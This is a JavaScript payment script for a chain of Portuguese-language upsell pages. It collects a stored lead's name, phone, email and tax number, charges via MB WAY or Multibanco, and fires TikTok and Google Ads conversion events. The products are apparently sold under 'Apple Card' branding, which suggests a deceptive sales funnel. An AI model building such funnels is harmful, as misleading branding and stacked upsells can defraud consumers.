/*
 * Lógica de pagamento partilhada entre os upsells.
 *
 * A configuração concreta (preço, próximo passo, título) é definida pelo HTML
 * via uma constante global UPSELL_CONFIG. Este script depende de tracker.js
 * (já carregado pelas páginas) para o pixel TikTok.
 */

(function () {
  'use strict';

  if (!window.UPSELL_CONFIG) {
    console.error('UPSELL_CONFIG em falta.');
    return;
  }

  var cfg = window.UPSELL_CONFIG;
  var amountCents = Math.round(cfg.price * 100);
  var currentMethod = 'mbway';
  var currentTransactionId = null;
  var statusPoll = null;
  var POLL_MS = 4000;
  var SESSION_TIMEOUT_MS = 15 * 60 * 1000;

  function $(id) { return document.getElementById(id); }
  function fmtEUR(v) { return '€' + v.toFixed(2).replace('.', ','); }

  function loadLead() {
    try { return JSON.parse(localStorage.getItem('applecard_lead') || '{}'); }
    catch (e) { return {}; }
  }

  function buildUrl(target) {
    var u = new URL(target, window.location.href);
    new URLSearchParams(window.location.search).forEach(function (v, k) { u.searchParams.set(k, v); });
    return u.toString();
  }

  // ─── Ecrã de loading inicial ───
  window.addEventListener('load', function () {
    var ls = $('loadingScreen');
    if (!ls) return;
    setTimeout(function () {
      ls.classList.add('hide');
      var main = $('mainPage');
      if (main) main.style.display = '';
      setTimeout(function () { ls.style.display = 'none'; }, 400);
    }, 700);
  });

  // ─── Seletor de método (injetado antes do botão Pagar) ───
  var METHOD_SELECTOR_HTML = ''
    + '<div id="methodSelector" class="ms-wrap fade-up">'
    +   '<div class="ms-label">Método de pagamento</div>'
    +   '<div class="ms-options">'
    +     '<button class="ms-opt active" data-method="mbway" type="button">'
    +       '<img src="../../assets/images/mbway.jpg" alt="">'
    +       '<div class="ms-text"><div class="ms-name">MB WAY</div><div class="ms-sub">Confirme no app</div></div>'
    +       '<div class="ms-dot"></div>'
    +     '</button>'
    +     '<button class="ms-opt" data-method="multibanco" type="button">'
    +       '<img src="../../assets/images/multibanco.png" alt="">'
    +       '<div class="ms-text"><div class="ms-name">Multibanco</div><div class="ms-sub">Entidade + ref.</div></div>'
    +       '<div class="ms-dot"></div>'
    +     '</button>'
    +   '</div>'
    + '</div>';

  // ─── HTML do modal (sem tabs — o método já foi escolhido fora do modal) ───
  var MODAL_HTML = ''
    + '<div class="pay-overlay" id="payOverlay">'
    +   '<div class="pay-modal">'
    +     '<div class="pay-modal-handle"></div>'
    +     '<div class="pay-modal-header">'
    +       '<h3 id="payModalTitle">Pagamento MB WAY</h3>'
    +       '<button class="pay-modal-close" id="payClose" aria-label="Fechar"><svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button>'
    +     '</div>'
    +     '<div class="pay-modal-body">'
    +       '<div class="pay-status" id="payStatus">'
    +         '<div class="ps-icon"><svg viewBox="0 0 24 24"><path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zM12 20c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8zm.5-13H11v6l5.25 3.15.75-1.23-4.5-2.67z"/></svg></div>'
    +         '<div class="ps-title" id="payStatusTitle">A aguardar pagamento...</div>'
    +         '<div class="ps-desc" id="payStatusDesc">Confirme no seu telemóvel</div>'
    +       '</div>'
    +       '<div class="pay-info" id="blockMbway">'
    +         '<div class="pay-info-brand"><img src="../../assets/images/mbway.jpg" alt="MB WAY"><div><div class="pib-txt">MB WAY</div><div class="pib-sub">Notificação enviada para o seu telemóvel</div></div></div>'
    +         '<div class="pay-info-rows">'
    +           '<div class="pay-info-row"><span class="pi-lbl">Telemóvel</span><div class="pi-phone" id="payPhone">—</div></div>'
    +           '<div class="pay-info-row"><span class="pi-lbl">Montante</span><div class="pi-amount" id="payMbwayAmount">€0,00</div></div>'
    +         '</div>'
    +       '</div>'
    +       '<div class="pay-info" id="blockMultibanco" style="display:none">'
    +         '<div class="pay-info-brand"><img src="../../assets/images/multibanco.png" alt="Multibanco"><div><div class="pib-txt">Rede Multibanco</div><div class="pib-sub">Pague no homebanking ou ATM</div></div></div>'
    +         '<div class="pay-info-rows">'
    +           '<div class="pay-info-row"><span class="pi-lbl">Entidade</span><div class="pi-field"><input id="payEntity" type="text" readonly value="—"><button class="copy-btn" data-target="payEntity">Copiar</button></div></div>'
    +           '<div class="pay-info-row"><span class="pi-lbl">Referência</span><div class="pi-field"><input id="payReference" type="text" readonly value="—"><button class="copy-btn" data-target="payReference">Copiar</button></div></div>'
    +           '<div class="pay-info-row"><span class="pi-lbl">Montante</span><div class="pi-amount" id="payMbAmount">€0,00</div></div>'
    +         '</div>'
    +       '</div>'
    +     '</div>'
    +   '</div>'
    + '</div>';

  // ─── Inicialização ───
  document.addEventListener('DOMContentLoaded', function () {
    // Injecta o modal no body se ainda não existir
    if (!$('payOverlay')) {
      var wrap = document.createElement('div');
      wrap.innerHTML = MODAL_HTML;
      document.body.appendChild(wrap.firstChild);
    }

    // Injecta o seletor de método antes do botão Pagar
    var payBtn = $('payBtn');
    if (payBtn && !$('methodSelector')) {
      var selWrap = document.createElement('div');
      selWrap.innerHTML = METHOD_SELECTOR_HTML;
      payBtn.parentNode.insertBefore(selWrap.firstChild, payBtn);

      document.querySelectorAll('.ms-opt').forEach(function (opt) {
        opt.addEventListener('click', function () {
          switchMethod(opt.getAttribute('data-method'));
        });
      });
    }

    var lead = loadLead();
    var customerName = $('customerName');
    if (customerName) customerName.textContent = lead.nome || '—';
    var customerNif = $('customerNif');
    if (customerNif) customerNif.textContent = (lead.nif_masked || lead.nif || '—');

    var priceEls = document.querySelectorAll('[data-price-display]');
    priceEls.forEach(function (el) { el.textContent = fmtEUR(cfg.price); });

    // ViewContent + Lead-na-página event para o pixel
    if (window.track) {
      window.track('ViewContent', {
        value: cfg.price,
        currency: 'EUR',
        content_id: cfg.id,
        content_name: cfg.title,
        content_type: 'product'
      });
    }

    if (payBtn) payBtn.addEventListener('click', startPayment);

    var skipBtn = $('skipBtn');
    if (skipBtn) skipBtn.addEventListener('click', function () {
      if (window.track) window.track('UpsellSkipped', { content_id: cfg.id, value: cfg.price, currency: 'EUR' });
      goToNext();
    });

    var closeBtn = $('payClose');
    if (closeBtn) closeBtn.addEventListener('click', closeModal);

    document.querySelectorAll('.copy-btn').forEach(function (btn) {
      btn.addEventListener('click', function () { copyField(btn); });
    });
  });

  function switchMethod(method) {
    currentMethod = (method === 'multibanco') ? 'multibanco' : 'mbway';
    document.querySelectorAll('.ms-opt').forEach(function (opt) {
      opt.classList.toggle('active', opt.getAttribute('data-method') === currentMethod);
    });
  }

  async function startPayment() {
    var btn = $('payBtn');
    btn.classList.add('loading');
    btn.disabled = true;

    if (window.track) {
      window.track('AddPaymentInfo', {
        value: cfg.price,
        currency: 'EUR',
        content_id: cfg.id,
        payment_method: currentMethod
      });
    }

    var lead = loadLead();
    var payload = {
      amount: amountCents,
      method: currentMethod,
      payerName: lead.nome || 'Cliente',
      email: lead.email || '',
      phone: lead.telefone || lead.phone || '',
      document: lead.nif || '',
      productName: 'Apple Card — ' + cfg.title,
      // gclid apenas para tracking (Google Ads) — não há roteamento de conta.
      gclid: localStorage.getItem('tt_gclid') || ''
    };

    try {
      var res = await fetch('/api/stripe-transaction', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      var data = await res.json();

      if (!data.success) {
        alert('Não foi possível gerar o pagamento: ' + (data.error || 'tente de novo.'));
        btn.classList.remove('loading');
        btn.disabled = false;
        return;
      }

      currentTransactionId = data.transactionId;
      renderModal(data);
      openModal();
      pollStatus();
      setTimeout(stopPolling, SESSION_TIMEOUT_MS);

    } catch (e) {
      alert('Erro de ligação. Verifique a sua internet e tente de novo.');
      btn.classList.remove('loading');
      btn.disabled = false;
    }
  }

  function renderModal(data) {
    var isMbway = data.method === 'mbway';
    $('payModalTitle').textContent = isMbway ? 'Pagamento MB WAY' : 'Pagamento Multibanco';
    $('blockMultibanco').style.display = isMbway ? 'none' : '';
    $('blockMbway').style.display = isMbway ? '' : 'none';

    if (isMbway) {
      var phone = (data.phone || '').replace(/^\+351/, '').replace(/(\d{3})(\d{3})(\d{3})/, '$1 $2 $3');
      $('payPhone').textContent = phone || '—';
      $('payMbwayAmount').textContent = fmtEUR(data.amount || cfg.price);
      $('payStatusDesc').textContent = 'Confirme com 1 toque no app MB WAY do seu banco.';
    } else {
      $('payEntity').value = data.entity || '—';
      $('payReference').value = data.reference || '—';
      $('payMbAmount').textContent = fmtEUR(data.amount || cfg.price);
      $('payStatusDesc').textContent = 'Pague pela referência abaixo no homebanking ou ATM.';
    }
  }

  function openModal() {
    $('payOverlay').classList.add('active');
    document.body.style.overflow = 'hidden';
  }

  function closeModal() {
    $('payOverlay').classList.remove('active');
    document.body.style.overflow = '';
  }

  function pollStatus() {
    if (statusPoll) clearInterval(statusPoll);
    statusPoll = setInterval(checkStatus, POLL_MS);
    setTimeout(checkStatus, 3000);
  }

  function stopPolling() { if (statusPoll) { clearInterval(statusPoll); statusPoll = null; } }

  async function checkStatus() {
    if (!currentTransactionId) return;
    try {
      var r = await fetch('/api/stripe-status?id=' + encodeURIComponent(currentTransactionId));
      var data = await r.json();
      if (data.status === 'APPROVED') {
        stopPolling();
        onApproved();
      }
    } catch (e) { /* tenta de novo no próximo poll */ }
  }

  function onApproved() {
    // Purchase — usa transactionId como event_id para dedup com o server-side.
    try {
      if (window.ttq && currentTransactionId) {
        var eid = 'purchase_' + currentTransactionId;
        window.ttq.track('Purchase', {
          value: cfg.price,
          currency: 'EUR',
          content_type: 'product',
          content_id: cfg.id,
          content_name: cfg.title,
          transaction_id: currentTransactionId,
          event_id: eid
        }, { event_id: eid });
      }
    } catch (e) {}

    // Google Ads — conversão de Compra do upsell.
    try { if (window.googleAdsPurchase && currentTransactionId) window.googleAdsPurchase(cfg.price, currentTransactionId); } catch (e) {}

    var status = $('payStatus');
    status.classList.add('paid');
    $('payStatusTitle').textContent = 'Pagamento confirmado!';
    $('payStatusDesc').textContent = 'A continuar para o próximo passo...';

    setTimeout(goToNext, 2000);
  }

  function goToNext() {
    var next = cfg.next || 'dashboard.html';
    window.location.href = buildUrl(next);
  }

  function copyField(btn) {
    var id = btn.getAttribute('data-target');
    var input = $(id);
    if (!input || !input.value || input.value === '—') return;
    var val = input.value;
    var done = function () {
      btn.textContent = '✓ Copiado';
      btn.classList.add('copied');
      setTimeout(function () { btn.textContent = 'Copiar'; btn.classList.remove('copied'); }, 2500);
    };
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(val).then(done).catch(function () { fallback(input, done); });
    } else {
      fallback(input, done);
    }
  }

  function fallback(input, done) {
    input.select(); input.setSelectionRange(0, 99999);
    document.execCommand('copy');
    done();
  }
})();
